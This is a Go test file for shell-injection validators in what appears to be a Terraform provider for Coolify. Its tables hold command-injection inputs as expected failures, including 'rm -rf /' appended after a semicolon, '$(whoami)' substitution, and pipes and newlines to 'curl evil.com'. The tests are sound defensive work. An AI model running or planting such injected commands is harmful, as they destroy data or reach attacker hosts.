package validate_test

import (
	"context"
	"testing"

	"github.com/coolify-terraform/terraform-provider-coolify/internal/validate"
	"github.com/hashicorp/terraform-plugin-framework/schema/validator"
	"github.com/hashicorp/terraform-plugin-framework/types"
)

func TestNoShellMetachars(t *testing.T) {
	tests := []struct {
		name    string
		value   string
		wantErr bool
	}{
		{"valid flags", "--memory=512m --cpus=2", false},
		{"valid privileged", "--privileged", false},
		{"valid network", "--network=host", false},
		{"semicolon", "--memory=512m; rm -rf /", true},
		{"pipe", "--memory=512m | cat", true},
		{"ampersand", "--memory=512m & echo pwned", true},
		{"backtick", "--memory=`whoami`", true},
		{"dollar", "--memory=$HOME", true},
		{"parens", "--memory=$(whoami)", true},
		{"braces", "--memory=${HOME}", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := validator.StringRequest{
				ConfigValue: types.StringValue(tt.value),
			}
			resp := &validator.StringResponse{}
			validate.NoShellMetachars().ValidateString(context.Background(), req, resp)

			if tt.wantErr && !resp.Diagnostics.HasError() {
				t.Errorf("expected error for %q but got none", tt.value)
			}
			if !tt.wantErr && resp.Diagnostics.HasError() {
				t.Errorf("unexpected error for %q: %s", tt.value, resp.Diagnostics.Errors()[0].Detail())
			}
		})
	}
}

func TestShellSafeCommand(t *testing.T) {
	tests := []struct {
		name    string
		value   string
		wantErr bool
	}{
		{"compose up", "docker compose up -d", false},
		{"compose build", "docker compose build", false},
		{"and chain", "docker compose up && docker compose logs", false},
		{"or chain", "make build || make clean", false},
		{"double quotes", `docker compose up -d --build-arg VERSION="1.0.0"`, false},
		{"single quotes", "docker compose up -d --build 'malicious'", false},
		{"empty", "", false},
		{"semicolon", "docker compose up; echo pwned", true},
		{"pipe", "docker compose build | curl evil.com", true},
		{"dollar", "docker compose build $(whoami)", true},
		{"backtick", "docker compose up `whoami`", true},
		{"newline", "docker compose up\ncurl evil.com", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := validator.StringRequest{ConfigValue: types.StringValue(tt.value)}
			resp := &validator.StringResponse{}
			validate.ShellSafeCommand().ValidateString(context.Background(), req, resp)
			if tt.wantErr && !resp.Diagnostics.HasError() {
				t.Errorf("expected error for %q but got none", tt.value)
			}
			if !tt.wantErr && resp.Diagnostics.HasError() {
				t.Errorf("unexpected error for %q: %s", tt.value, resp.Diagnostics.Errors()[0].Detail())
			}
		})
	}
}

func TestDockerTarget(t *testing.T) {
	tests := []struct {
		name    string
		value   string
		wantErr bool
	}{
		{"stage", "production", false},
		{"dotted", "build.stage", false},
		{"hyphen", "prod-api", false},
		{"empty", "", false},
		{"leading hyphen", "-prod", true},
		{"space", "prod api", true},
		{"slash", "stage/one", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := validator.StringRequest{ConfigValue: types.StringValue(tt.value)}
			resp := &validator.StringResponse{}
			validate.DockerTarget().ValidateString(context.Background(), req, resp)
			if tt.wantErr && !resp.Diagnostics.HasError() {
				t.Errorf("expected error for %q but got none", tt.value)
			}
			if !tt.wantErr && resp.Diagnostics.HasError() {
				t.Errorf("unexpected error for %q: %s", tt.value, resp.Diagnostics.Errors()[0].Detail())
			}
		})
	}
}

func TestNoShellMetachars_NullAndUnknown(t *testing.T) {
	for _, tc := range []struct {
		name  string
		value types.String
	}{
		{"null", types.StringNull()},
		{"unknown", types.StringUnknown()},
	} {
		t.Run(tc.name, func(t *testing.T) {
			req := validator.StringRequest{ConfigValue: tc.value}
			resp := &validator.StringResponse{}
			validate.NoShellMetachars().ValidateString(context.Background(), req, resp)
			if resp.Diagnostics.HasError() {
				t.Errorf("expected no error for %s value, got: %s", tc.name, resp.Diagnostics.Errors()[0].Detail())
			}
		})
	}
}
